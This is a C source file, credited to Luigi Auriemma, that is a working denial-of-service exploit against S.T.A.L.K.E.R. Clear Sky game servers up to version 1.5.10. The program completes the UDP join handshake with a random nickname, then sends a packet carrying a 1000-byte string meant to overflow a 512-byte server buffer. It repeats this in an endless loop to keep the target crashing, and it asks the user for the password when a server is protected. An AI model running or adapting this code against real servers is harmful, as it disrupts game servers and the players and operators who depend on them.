/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define sleep   Sleep
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif

typedef uint8_t     u8;
typedef uint16_t    u16;
typedef uint32_t    u32;



#define VER         "0.1"
#define BUFFSZ      1472
#define PORT        5445
#define BOOMSZ      1000    // major than "snprint(buffer,512"



int rndxx(u8 *data, int len, u32 *seed);
int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err);
int putcc(u8 *dst, int chr, int len);
int putws(u8 *dst, u8 *src);
int fgetz(FILE *fd, u8 *data, int size);
int getxx(u8 *data, u32 *ret, int bits);
int putxx(u8 *data, u32 num, int bits);
int timeout(int sock, int secs);
u32 resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer,
                        peerl;
    u32     res,
            ver,
            seed;
    int     sd,
            i,
            len,
            pwdlen,
            nicklen,
            pck;
    u16     port        = PORT;
    u8      buff[BUFFSZ],
            nick[64],
            pwd[64]     = "",
            *host,
            *p;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    setbuf(stdout, NULL);

    fputs("\n"
        "S.T.A.L.K.E.R. Clear Sky <= 1.5.10 malloc exception "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@autistici.org\n"
        "web:    aluigi.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%hu)]\n"
            "\n", argv[0], port);
        exit(1);
    }

    host = argv[1];
    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(host);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    peerl.sin_addr.s_addr = INADDR_ANY;
    peerl.sin_port        = htons(time(NULL));
    peerl.sin_family      = AF_INET;

    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));

    ver = 0x00010006;
    printf("\n- use version %08x\n", ver);
    seed = time(NULL);

    for(;;) {
        printf("\n  Player: ");

        sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if(sd < 0) std_err();
        do {
            peerl.sin_port++;
        } while(bind(sd, (struct sockaddr *)&peerl, sizeof(peerl)) < 0);

        seed = (seed * 0x343FD) + 0x269EC3;

        for(pck = 0; pck <= 5; pck++) {
             p = buff;
            switch(pck) {
                case 0: {
                    *p++ = 0x88;
                    *p++ = 0x01;
                    *p++ = 0x00;
                    *p++ = 0x00;
                    p += putxx(p, ver,        32);
                    p += putxx(p, seed,       32);
                    p += putxx(p, seed,       32);  // should be a different number
                    break;
                }
                case 1: {
                    *p++ = 0x80;
                    *p++ = 0x02;
                    *p++ = 0x01;
                    *p++ = 0x00;
                    p += putxx(p, ver,        32);
                    p += putxx(p, seed,       32);
                    p += putxx(p, seed,       32);  // should be a different number
                    break;
                }
                case 2: {
                    *p++ = 0x3f;
                    *p++ = 0x02;
                    *p++ = 0x00;
                    *p++ = 0x00;
                    p += putxx(p, seed,       32);
                    break;
                }
                case 3: {
                    rndxx(nick, sizeof(nick) - 1, &seed);   // seed is no longer needed
                    nick[63] = 0;   // avoid the dirtysky bug

                    *p++ = 0x7f;
                    *p++ = 0x00;
                    *p++ = 0x01;
                    *p++ = 0x00;
                    p += putxx(p, 0x000000c1, 32);
                    p += putxx(p, 0x00000002, 32);
                    p += putxx(p, 0x00000007, 32);
                    p += putcc(p, 0,          0x50);// hash at 0x48 set to zeroes
                    pwdlen = putws(p, pwd);   p += pwdlen;
                    p += putcc(p, 0,          4);   // don't know
                    strncpy(p, nick, 0x80);   p += 0x80;
                    p += putxx(p, 1,          32);
                    nicklen = putws(p, nick); p += nicklen;

                    putxx(buff + 0x10, 0xe0 + pwdlen, 32);
                    putxx(buff + 0x14, nicklen, 32);
                    putxx(buff + 0x18, 0x58 + pwdlen, 32);
                    if(pwd[0]) putxx(buff + 0x20, 0x58, 32);
                    putxx(buff + 0x24, pwdlen, 32);
                    break;
                }
                case 4: {
                    *p++ = 0x7f;
                    *p++ = 0x00;
                    *p++ = 0x02;
                    *p++ = 0x02;
                    p += putxx(p, 0x000000c3, 32);
                    break;
                }
                case 5: {
                    *p++ = 0x3d;
                    *p++ = 0x00;
                    *p++ = 0x03;
                    *p++ = 0x04;
                    *p++ = 0xe1;
                    p += putxx(p, BOOMSZ + 4,   16);
                    *p++ = 0xc0;
                    p += putxx(p, BOOMSZ + 2,   16);
                    p += putxx(p, 0x16,         16);
                    p += putcc(p, 'A',          BOOMSZ - 1);
                    *p++ = 0;   // NULL delimiter of the previous string
                    break;
                }
                default: break;
            }

            len = send_recv(sd, buff, p - buff, buff, BUFFSZ, &peer, 1);

            if(pck == 3) {
                while(buff[0] != 0x7f) {
                    len = send_recv(sd, NULL, 0, buff, BUFFSZ, &peer, 1);
                }
                getxx(buff + 8, &res, 32);
                if(res == 0x80158410) {
                    printf("\n- server is protected by password, insert it: ");
                    fgetz(stdin, pwd, sizeof(pwd));
                    break;
                } else if(res == 0x80158610) {
                    printf("\n  server full ");
                    for(i = 5; i; i--) {
                        printf("%d\b", i);
                        sleep(ONESEC);
                    }
                    break;
                } else if(res == 0x80158260) {
                    printf("\nError: your IP is banned\n");
                    exit(1);
                } else if(res) {
                    printf("\n- unknown error number (0x%08x), I try to continue", res);
                    //exit(1);
                }
            }
        }

        close(sd);
        sleep(ONESEC);  // not needed
    }
    return(0);
}



int rndxx(u8 *data, int len, u32 *seed) {
    u32     rnd;
    u8      *p;
    static const char table[] =
                "0123456789"
                "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                "abcdefghijklmnopqrstuvwxyz";

    rnd = *seed;
    len = rnd % len;
    if(len < 4) len = 4;

    for(p = data; --len; p++) {
        rnd = (rnd * 0x343FD) + 0x269EC3;
        rnd >>= 3;  // stupid but useful
        *p = table[rnd % (sizeof(table) - 1)];
    }
    *p = 0;

    *seed = rnd;
    return(p - data);
}



int send_recv(int sd, u8 *in, int insz, u8 *out, int outsz, struct sockaddr_in *peer, int err) {
    int     retry = 2,
            len;

    if(in) {
        while(retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) goto quit;
            if(!out) return(0);
            if(!timeout(sd, 1)) break;
        }
    } else {
        if(timeout(sd, 2) < 0) retry = -1;
    }

    if(retry < 0) {
        if(!err) return(-1);
        printf("\nError: socket timeout, no reply received\n\n");
        exit(1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0) goto quit;
    return(len);
quit:
    if(err) std_err();
    return(-1);
}



int putcc(u8 *dst, int chr, int len) {
    memset(dst, chr, len);
    return(len);
}



int putws(u8 *dst, u8 *src) {
    u8      *d,
            *s;

    if(!src[0]) return(0);  // as required by stalker
    for(s = src, d = dst; ; s++) {
        *d++ = *s;
        *d++ = 0;
        if(!*s) break;
    }
    return(d - dst);
}



int fgetz(FILE *fd, u8 *data, int size) {
    u8     *p;

    if(!fgets(data, size, fd)) return(-1);
    for(p = data; *p && (*p != '\n') && (*p != '\r'); p++);
    *p = 0;
    return(p - data);
}



int getxx(u8 *data, u32 *ret, int bits) {
    u32     num;
    int     i,
            bytes;

    bytes = bits >> 3;
    for(num = i = 0; i < bytes; i++) {
        num |= (data[i] << (i << 3));
    }
    *ret = num;
    return(bytes);
}



int putxx(u8 *data, u32 num, int bits) {
    int     i,
            bytes;

    bytes = bits >> 3;
    for(i = 0; i < bytes; i++) {
        data[i] = (num >> (i << 3)) & 0xff;
    }
    return(bytes);
}



int timeout(int sock, int secs) {
    struct  timeval tout;
    fd_set  fd_read;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    if(select(sock + 1, &fd_read, NULL, NULL, &tout)
      <= 0) return(-1);
    return(0);
}



u32 resolv(char *host) {
    struct  hostent *hp;
    u32     host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u32 *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


